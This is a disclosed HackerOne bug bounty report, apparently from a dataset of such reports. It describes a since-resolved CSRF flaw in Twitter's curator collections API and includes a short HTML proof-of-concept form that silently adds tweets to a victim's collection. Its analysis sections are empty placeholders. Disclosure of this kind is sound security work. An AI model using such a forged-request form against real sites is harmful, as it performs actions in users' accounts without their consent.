---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '100820'
original_report_id: '100820'
title: Add tweet to collection CSRF
weakness: Cross-Site Request Forgery (CSRF)
team_handle: x
created_at: '2015-11-21T09:39:00.270Z'
disclosed_at: '2016-08-22T18:54:18.564Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 10
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# Add tweet to collection CSRF

## Metadata

- HackerOne Report ID: 100820
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: x
- Disclosed At: 2016-08-22T18:54:18.564Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi Team,

I have found a CSRF vulnerability which force victim to add tweets in his collection.

HTML POC : 

<html>
<body>
<form action="https://curator.twitter.com/api/collections/STREAM/content" method="POST">
<input type="hidden" name="tweet_ids[]" value="667977435124658176">
<input type="hidden" name="collections[]" value="667916850294951936">
<input type="hidden" name="model[id]" value="STREAM">
<input type=submit>
</body>
</html>

Before using this POC change the Collection ID to your collection ID and you will see that tweet will be added into your collection.You can Also add so many tweets in one request by adding "tweet_ids" parameter multiple times.

Let me know if you need any other help from my side.

Best Regards !
Vijay Kumar

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
